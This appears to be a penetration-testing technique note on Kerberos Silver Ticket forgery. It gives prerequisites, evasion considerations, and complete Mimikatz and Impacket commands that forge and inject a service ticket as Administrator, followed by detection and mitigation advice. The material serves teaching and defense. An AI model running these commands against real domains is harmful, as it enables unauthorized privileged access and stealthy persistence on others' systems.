---
tags:
  - "#type/technique"
  - "#tactic/TA0003"
  - "#tactic/TA0008"
  - "#technique/T1558.002"
  - "#stage/persistence"
  - "#stage/lateral-movement"
  - "#os/windows"
  - "#protocol/kerberos"
  - "#tool/mimikatz"
  - "#tool/impacket"
aliases:
  - Silver Ticket Attack
  - Forged Service Ticket
  - TGS Forgery
---

## Technique
___

A Silver Ticket is a forged Kerberos service ticket (TGS) that an attacker creates using the password hash of a service account. Unlike a Golden Ticket (which is a forged TGT signed with the KRBTGT hash), a Silver Ticket is specific to a particular service on a particular server.

This technique allows an attacker to bypass the normal Kerberos authentication process and gain unauthorized access to specific services without interacting with the Domain Controller. By forging a service ticket, an attacker can impersonate any user of their choosing to the targeted service.

## Prerequisites
___

**Access Level:** An attacker must first obtain the password hash (NTLM hash, RC4 key, or AES keys) of the target computer account or service account. This typically requires prior administrative access to the target server.

**Information Needed:**
- Service account password hash or computer account password hash
- Domain SID
- Domain name
- Username to impersonate
- Target server FQDN
- Service SPN (Service Principal Name) type (e.g., CIFS, HTTP, MSSQL)

## Considerations
___

**Impact**

Silver Tickets provide targeted persistence and lateral movement capabilities, allowing an attacker to:
- Access specific services as any user, including privileged accounts
- Operate without communicating with a Domain Controller
- Potentially bypass detection mechanisms that focus on TGT issuance

**Limitations**

- Limited to specific services on specific hosts (unlike Golden Tickets, which work domain-wide)
- Computer account passwords change automatically every 30 days by default, requiring the attacker to re-obtain the hash
- Does not provide a valid PAC (Privilege Attribute Certificate) for domain services that validate PACs

**OPSEC**

- Silver Tickets generate fewer event logs than normal Kerberos authentication
- No event logs are generated on Domain Controllers since they're not involved in the ticket creation
- Can potentially evade detection systems that focus on unusual TGT requests

## Execution
___

### Using Mimikatz

First, obtain the necessary information for creating a Silver Ticket:
- Domain SID: Use `whoami /user` (the SID minus the last portion is the domain SID)
- Target server name and service type
- Password hash of the service/computer account

Create and inject the Silver Ticket:

```powershell
# Basic Silver Ticket for CIFS service on DC01
mimikatz # kerberos::golden /domain:contoso.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:dc01.contoso.local /service:cifs /rc4:1a59bd44fe5bec57d1c8f98e253a7091 /user:Administrator /ptt

# Silver Ticket for HOST service
mimikatz # kerberos::golden /domain:contoso.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:server01.contoso.local /service:host /rc4:1a59bd44fe5bec57d1c8f98e253a7091 /user:Administrator /ptt

# Silver Ticket with AES256 key instead of RC4
mimikatz # kerberos::golden /domain:contoso.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:server01.contoso.local /service:cifs /aes256:1a59bd44fe5bec57d1c8f98e253a7091b59bd44fe5bec57d1c8f98e253a70915 /user:Administrator /ptt
```

### Using Impacket

```bash
# Generate a Silver Ticket for CIFS service on server01
impacket-ticketer -nthash 1a59bd44fe5bec57d1c8f98e253a7091 -domain contoso.local -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -spn cifs/server01.contoso.local Administrator

# Set the ticket for use
export KRB5CCNAME=Administrator.ccache

# Use the ticket to access the target
impacket-smbclient -k server01.contoso.local -no-pass
```

### Common Service Types for Silver Tickets

Different services require different SPNs for effective Silver Ticket attacks:

| Service | SPN Type | Possible Actions |
|---------|----------|------------------|
| File Shares | CIFS | Access files on the target server |
| PowerShell Remoting | HOST, HTTP, WSMAN | Remote PowerShell access |
| WMI | HOST, RPCSS | Remote WMI queries and execution |
| Scheduled Tasks | HOST | Create or modify scheduled tasks |
| Windows Management | RPCSS | Remote management operations |
| SQL Server | MSSQL | Database access and command execution |
| DNS Server | DNS | DNS administration |

## Detection & Mitigation
___

### Detection

- Look for events with mismatched SPNs and services being accessed
- Monitor for service ticket requests without corresponding TGT activity
- Check for anomalies in PAC validation
- Audit for unexpected privileged actions by accounts, particularly against specific services

### Mitigation

- Implement strong password policies for service accounts
- Use Group Managed Service Accounts (gMSAs) where possible to automate password management
- Enable Kerberos PAC validation on sensitive servers
- Consider shortening the machine account password change interval from the default 30 days
- Implement robust monitoring for suspicious Kerberos ticket usage
- Use the Protected Users security group for privileged accounts
- Implement tiered administration and network segmentation to limit credential exposure